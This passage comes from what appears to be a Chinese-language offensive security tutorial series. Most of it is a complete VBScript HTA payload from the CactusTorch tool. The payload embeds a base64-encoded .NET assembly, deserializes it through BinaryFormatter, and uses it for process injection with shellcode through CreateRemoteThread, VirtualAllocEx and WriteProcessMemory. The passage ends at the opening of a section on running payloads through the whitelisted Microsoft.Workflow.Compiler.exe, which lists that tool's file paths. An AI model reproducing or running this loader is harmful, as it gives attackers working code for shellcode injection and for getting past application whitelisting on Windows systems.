&quot;ZW1ibHkGFwAAAARMb2FkCg8MAAAAAB4AAAJNWpAAAwAAAAQAAAD&#x2F;&#x2F;wAAuAAAAAAAAABAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABMAQMAkNhXWQAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAA4AAiIAsBMAAAFgAAAAYAAAAAAAByNQAAACAAAABAAAAAAAAQACAAAAACAAAEAAAAAAAAAAQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAAIDUA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AE8AAAAAQAAAkAMAAAAAAAAAAAAAAAAAAAAAAAAAYAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAALnRleHQAAAB4FQAAACAAAAAWAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAAkAMAAABA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAABAAAABgAAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAAcAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAFQ1AAAAAAAASAAAAAIABQD4IQAAKBMAAAEAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHgIoDwAACioT&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;MAoABwEAAAEAABEEKBAAAAoKEgEGjmkoEQAACnMJAAAGDAgWfTUAAARyAQAAcBMEcgMAAHAoEgAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Cm8TAAAKFjEZch0AAHAoEgAACnIrAABwAygUAAAKEwQrF3IdAABwKBIAAApyQQAAcAMoFAAAChME&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;EQQUFBQXGn4VAAAKFAgSAygBAAAGJgl7BAAABBMFEgUoFgAACnJXAABwKBcAAAosbhEFFnMRAAAK&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ByAAMAAAH0AoAgAABhMGEgYoFgAACnJXAABwKBgAAAosChEFFigEAAAGJioWEwcSCAaOaSgRAAAK&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;EQURBgYRCBEHKAMAAAYmEQUWcxEAAAoWEQYWcxEAAAoWFnMRAAAKKAUAAAYmKnoCfhUAAAp9AgAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BAIoDwAACgICKBkAAAp9AQAABCoAABMwAgBgAAAAAAAAAAJ+FQAACn0rAAAEAn4VAAAKfSwAAAQC&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;fhUAAAp9LQAABAJ+FQAACn04AAAEAn4VAAAKfTkAAAQCfhUAAAp9OgAABAJ+FQAACn07AAAEAigP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAKAgIoGQAACn0qAAAEKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAACgHAAAj&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;fgAAlAcAAEwJAAAjU3RyaW5ncwAAAADgEAAAXAAAACNVUwA8EQAAEAAAACNHVUlEAAAATBEAANwB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAjQmxvYgAAAAAAAAACAAABVx0CFAkCAAAA+gEzABYAAAEAAAAXAAAACQAAAFAAAAAJAAAAHwAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ABkAAAAzAAAAEgAAAAEAAAABAAAABQAAAAEAAAABAAAABwAAAAAAmQYBAAAAAAAGAFwFkgcGAMkF&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;kgcGAIoEYAcPALIHAAAGALIE4QYGADAF4QYGABEF4QYGALAF4QYGAHwF4QYGAJUF4QYGAMkE4QYG&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AJ4EcwcGAHwEcwcGAPQE4QYGAKsIqQYGAGEEqQYGAE0FqQYGALAGqQYGAMoIqQYGAFkHqQYGAL4I&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;qQYGAGYGqQYGAIQGcwcAAAAAJQAAAAAAAQABAAEAEABtBgAAPQABAAEACgAQAPgHAAA9AAEACAAK&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ARAAzgYAAEEABAAJAAIBAAAbCAAASQAIAAkAAgEAADYIAABJACcACQAKABAABgcAAD0AKgAJAAIB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE&#x2F;QAGAHQIPwAGAOcDPwAG&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7&#x2F;4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv&quot;</span><br><span class="line">s &#x3D; s &amp; &quot;bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA&quot;</span><br><span class="line">entry_class &#x3D; &quot;cactusTorch&quot;</span><br><span class="line"></span><br><span class="line">Dim fmt, al, d, o</span><br><span class="line">Set fmt &#x3D; CreateObject(&quot;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&quot;)</span><br><span class="line">Set al &#x3D; CreateObject(&quot;System.Collections.ArrayList&quot;)</span><br><span class="line">al.Add fmt.SurrogateSelector</span><br><span class="line"></span><br><span class="line">Set d &#x3D; fmt.Deserialize_2(Base64ToStream(s))</span><br><span class="line">Set o &#x3D; d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)</span><br><span class="line">o.flame binary,code</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">SetVersion</span><br><span class="line">On Error Resume Next</span><br><span class="line">Run</span><br><span class="line">If Err.Number &lt;&gt; 0 Then</span><br><span class="line">  Debug Err.Description</span><br><span class="line">  Err.Clear</span><br><span class="line">End If</span><br><span class="line"></span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>


<h2 id="76-基于白名单Compiler-exe执行payload第六季"><a href="#76-基于白名单Compiler-exe执行payload第六季" class="headerlink" title="76.  基于白名单Compiler.exe执行payload第六季"></a>76.  基于白名单Compiler.exe执行payload第六季</h2><ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
